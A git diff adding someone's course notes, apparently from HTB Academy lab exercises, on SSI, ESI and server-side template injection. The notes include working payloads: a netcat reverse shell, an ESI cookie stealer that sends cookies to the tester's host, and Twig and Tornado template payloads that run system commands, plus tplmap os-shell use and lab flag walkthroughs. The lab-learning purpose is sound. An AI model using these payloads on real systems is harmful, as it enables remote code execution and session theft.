@@ -366,21 +366,251 @@ In some situations, the application may fail immediately instead of taking more 
 
 ## Server Side Includes Overview
 
+Server-side includes (SSI) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:
+
+``` html
+// Date
+<!--#echo var="DATE_LOCAL" -->
+
+// Modification date of a file
+<!--#flastmod file="index.html" -->
+
+// CGI Program results
+<!--#include virtual="/cgi-bin/counter.pl" -->
+
+// Including a footer
+<!--#include virtual="/footer.html" -->
+
+// Executing commands
+<!--#exec cmd="ls" -->
+
+// Setting variables
+<!--#set var="name" value="Rich" -->
+
+// Including virtual files (same directory)
+<!--#include virtual="file_to_include.html" -->
+
+// Including files (same directory)
+<!--#include file="file_to_include.html" -->
+
+// Print all variables
+<!--#printenv -->
+```
+
+The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.
+
+We need to submit payloads to the target application, such as the ones mentioned above, through input fields to test for SSI injection. The web server will parse and execute the directives before rendering the page if a vulnerability is present, but be aware that those vulnerabilities can exist in blind format too. Successful SSI injection can lead to extracting sensitive information from local files or even executing commands on the target web server.
+
 ## SSI Injection Explotation Example
+
+This section just has us spawn a target and try some of previous commands to see if there is SSI Injection and low-and-behold there is. 
+
+Then it mentions:
+As we saw, running OS commands via SSI on the target application is possible, but who doesn't love shells? Have in mind the following reverse shell payload that will work even against OpenBSD-netcat that doesn't include the execute functionality by default. Also note that you won't be able to obtain a reverse shell in this section's exercise, due to network restrictions! 
+``` html
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->```
+
+- mkfifo /tmp/foo: Create a FIFO special file in /tmp/foo
+- nc <IP> <PORT> 0</tmp/foo: Connect to the pentester machine and redirect the standard input descriptor
+- | bin/bash 1>/tmp/foo: Execute /bin/bash redirecting the standard output descriptor to /tmp/foo
+- rm /tmp/foo: Cleanup the FIFO file
+
+The question int his section:
+Use what you learned in this section to read the content of .htaccess.flag through SSI and submit it as your answer. 
+
+<!--#exec cmd="ls -a" --> shows that .htaccess.flag is in the current directory.
+<!--#exec cmd="cat .htaccess.flag" --> shows the flag
 
 # Edge Sides Includes (ESI) Injection
 
 ## Edge-Side Includes (ESI) 
 
+Edge Side Includes (ESI) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content, which would be otherwise unstorable through traditional caching protocols. Edge Side Includes (ESI) allow for dynamic web content assembly at the edge of the network (Content Delivery Network, User's Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (XML tags).
+
+ESI tags are used to instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional information regarding a web page with an already cached template. This information may come from another server before rendering the web page to the end-user. ESI enable fully cached web pages to include dynamic content.
+
+Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags by an attacker.
+
+Although we can identify the use of ESI by inspecting response headers in search for Surrogate-Control: content="ESI/1.0", we usually need to use a blind attack approach to detect if ESI is in use or not. Specifically, we can introduce ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible. Some useful ESI tags are:
+
+``` html
+// Basic detection
+<esi: include src=http://<PENTESTER IP>>
+
+// XSS Exploitation Example
+<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>
+
+// Cookie Stealer (bypass httpOnly flag)
+<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>
+
+// Introduce private local files (Not LFI per se)
+<esi:include src="supersecret.txt">
+
+// Valid for Akamai, sends debug information in the response
+<esi:debug/>
+```
+
+In some cases, we can achieve remote code execution when the application processing ESI directives supports XSLT, a dynamic language used to transform XML files. In that case, we can pass dca=xslt to the payload. The XML file selected will be processed with the possibility of performing XML External Entity Injection Attacks (XXE) with some limitations.
+
+[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) has created a table to help us understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported. Let us provide some explanations regarding the column names of the below table first:
+
+
+- Includes: Supports the <esi:includes> directive
+- Vars: Supports the <esi:vars> directive. Useful for bypassing XSS Filters
+- Cookie: Document cookies are accessible to the ESI engine
+- Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
+- Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts
+
+```
+Software 	Includes 	Vars 	Cookies 	Upstream Headers Required 	Host Whitelist
+Squid3 	Yes 	Yes 	Yes 	Yes 	No
+Varnish Cache 	Yes 	No 	No 	Yes 	Yes
+Fastly 	Yes 	No 	No 	No 	Yes
+Akamai ESI Test Server (ETS) 	Yes 	Yes 	Yes 	No 	No
+NodeJS esi 	Yes 	Yes 	Yes 	No 	No
+NodeJS nodesi 	Yes 	No 	No 	No 	Optional
+```
+
 # Server-Side Template Injections
 
 ## Intro to Template Engines
 
+This section just covers what template injections are and then gives some templates for us to test with locally if we want.
+
 ## SSTI Indentificaiton
+
+We can detect SSTI vulnerabilities by injecting different tags in the inputs we control to see if they are evaluated in the response. We don't necessarily need to see the injected data reflected in the response we receive. Sometimes it is just evaluated on different pages (blind).
+
+The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:
+``` html
+{7*7}
+${7*7}
+#{7*7}
+%{7*7}
+{{7*7}}
+```
+
+We will look for "49" in the response when injecting these payloads to identify that server-side evaluation occurred.
+
+The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include ${{<%[%'"}}%\. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions.
+
+We can use tools such as [Tplmap](https://github.com/epinna/tplmap) or J2EE Scan (Burp Pro) to automatically test for SSTI vulnerabilities or create a payload list to use with Burp Intruder or ZAP.
+
+There's a diagram on this page from PortsSwigger https://portswigger.net/research/server-side-template-injection that can help us determine what the technology that is vulnerable is:
+
+Or we can try:
+
+- Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used
+- Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI
+- Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.
 
 ## SSTI Exploitation Example 1
 
+The focus of this section is to identify if SSTI exists then leverage to get the flag.
+
+In the input field we can submit {7*7} and see if that results in 49. It doesn't.
+So lets try ${7*7}. Nothing.
+What about {{7*7}}? That works. So its vulnerable.
+
+If we use the portswigger diagram, we may be able to determine what the underlying template engine is.
+When {{7*7}} is evaluated successfully it tells us to try: {{7*'7'}}.
+
+Since this works, we can tell we are dealing with either Jinja2 or Twig.
+
+There are template specific payloads we can try to determine which:
+Lets try the Twig one.
+``` php
+{{_self.env.display("TEST")}}
+```
+
+And this worked, so we are working with twig.
+
+If we want more template specific payloads we can get them here:
+[PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+[HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+
+We could have automated the template engine identification process we just executed through tplmap, as follows. If you didn't notice, the user's input is submitted via the name parameter and through a POST request (hence the -d parameter in tplmap).
+
+```
+git clone https://github.com/epinna/tplmap.git
+cd tplmap
+pip install virtualenv
+virtualenv -p python2 venv
+source venv/bin/activate
+pip install -r requirements.txt
+./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john
+```
+
+This ^ expects Python2 which is no longer supported on Mac. To install this would have required extra work so I didn't.
+
+The next step is to gain remote code execution on the target server. Before moving the payload part, it should be mentioned that Twig has a variable _self, which, in simple terms, makes a few of the internal APIs public. This _self object has been documented, so we don't need to brute force any variable names (more on that in the next SSTI exploitation examples). Back to the remote code execution part, we can use the getFilter function as it allows execution of a user-defined function via the following process:
+
+- Register a function as a filter callback via registerUndefinedFilterCallback
+- Invoke _self.env.getFilter() to execute the function we have just registered
+
+```php
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
+```
+
+If we do this with cURL `curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>`
+
+We see we are root.
+
+We could once again have used tplmap to get remote code execution. But I don't think thats neccessary.
+
+The question in this section is:
+Use what you learned in this section to obtain the flag which is hidden in the environment variables. Answer format: HTB{String} 
+
+Running `curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("printenv")}}' http://<TARGET IP>:<PORT>`
+
+We get the answer.
+
 ## SSTI Exploitation Example 2
+
+This is another SSTI example. In this section we are dealing with an email application that takes the variable and sends it via a post request.
+
+So we can try, `curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam`
+
+The response doesn't seem to indicate this worked. So lets try:
+`curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam`
+
+This one worked. So using the PortSwigger diagram, lets try:
+`curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam`
+
+This one worked as well, however, if we try to submit the Twig or Jinja2 specific payloads both fail.
+`curl -X POST -d 'email={{_self.env.display("TEST")}}' http://<TARGET IP>:<PORT>/jointheteam`
+`curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam`
+
+So obviously that diagram is not perfect.
+
+What we could do is compile a list of payloads from `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2` and `https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection` and try to get the answer from that.
+
+Eventually we would find that a Tornado specific payload works.
+`curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam`
+
+Here is where tplmap would be nice... because it automates this discovery. Perhaps I need to look into getting python2 on my Mac.
+
+I followed the instructions on [this page](https://stackoverflow.com/questions/71739870/how-to-install-python-2-on-macos-12-3) to get python2 installed using pyenv 
+
+Now I can run `pyenv shell 2.7.18` and running python should target python2.
+
+Now if I try to run the commands from above again...
+
+Still fails... 
+
+I am going to say that if I have to use tplmap I will just use the pwnbox. It should already be on a Kali Linux distro.
+
+The question in this section is:
+Use what you learned in this section to read the contents of flag.txt, which resides in the current working directory. Answer format: HTB{String} 
+
+Running  `./tplmap.py -u 'http://94.237.53.3:55510/jointheteam' -d email=blah --os-shell` on the pwnbox works
+
+Then running:
+```
+ls
+cat flag.txt
+```
+Gets the answer
 
 ## SSTI Exploitation Example 3
 
